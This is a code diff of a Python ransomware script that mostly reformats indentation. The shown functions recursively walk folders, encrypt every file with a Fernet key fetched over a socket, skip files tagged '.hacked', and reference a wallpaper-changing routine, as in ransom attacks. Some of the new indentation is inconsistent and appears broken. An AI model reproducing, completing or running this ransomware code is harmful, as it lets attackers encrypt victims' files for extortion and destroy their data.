@@ -34,20 +34,16 @@ def changewallpaper(path):
 def encrypt_file(path, key, data):
 	if os.getcwd()+__file__ == path:
 		pass
-	
-  elif path.endswith(".hacked")==True:
+	elif path.endswith(".hacked")==True:
 		pass
-	
-  else:
+	else:
 		token = key.encrypt(data)
 		data2 = base64.b64encode(token)
 		return data2
 
 def encrypt(path, key):
-	
 	if sys.argv[0] in path:
 		pass
-	
 	else:
 		with open(path, 'rb') as f:
 			data = f.read()
@@ -65,11 +61,9 @@ def encryption(path, key):
 		for fichier in fichiers:
 			if os.getcwd()+'\\'+__file__ == path:
 				pass
-			
-      elif fichier.endswith(".hacked") == True:
+			elif fichier.endswith(".hacked") == True:
 				pass
-			
-      else:
+			else:
 				try:
 					encrypt(os.path.join(dossier, fichier), key)
 				except:
@@ -79,14 +73,14 @@ def get_key():
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	
   try:
-		sock.connect(('localhost',1550))
-		key = sock.recv(10000)
-		fern = base64.b64decode(key)
-		return fern
+	sock.connect(('localhost',1550))
+	key = sock.recv(10000)
+	fern = base64.b64decode(key)
+	return fern
 	
   except:
-		win32ui.MessageBox('Please restart the script','Error')
-		sys.exit(1)
+	win32ui.MessageBox('Please restart the script','Error')
+	sys.exit(1)
 
 
 if __name__ == '__main__':
